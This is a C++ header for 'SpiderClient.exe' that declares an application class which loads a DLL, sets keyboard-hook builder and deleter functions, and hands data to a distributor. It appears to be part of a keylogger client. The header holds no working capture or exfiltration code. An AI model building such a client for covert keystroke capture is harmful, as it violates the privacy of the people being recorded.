#pragma once

#include <iostream>
#include <string>
#include <stdexcept>
#include <fstream>
#include <memory>

#include "Distributor.h"
#include "DLLHandler.h"
#include "StaticTools.h"

#include <Windows.h>
#include <ShlObj.h>
#include <TlHelp32.h>

# define APP_NAME "SpiderClient.exe"

typedef void(__stdcall *KBHookBuilder)(void);
typedef void(__stdcall *KBHookDeleter)(void);
typedef void(*AppliPathSetter)(std::string const&);
typedef void(*DistributorSetter)(std::shared_ptr<Distributor>);

class Application
{
public:
	Application(std::string const& appliPath);
	~Application();

	void init(void);
	void loop(void);
	void close(void);

	static bool Existing(void);
private:
	std::string _appliPath;

	DLLHandler _dllHandler;
	KBHookBuilder _hookBuilder;
	KBHookDeleter _hookDeleter;
	AppliPathSetter _appliPathSetter;
	DistributorSetter _distriSetter;

	std::shared_ptr<Distributor> _distributor;
};
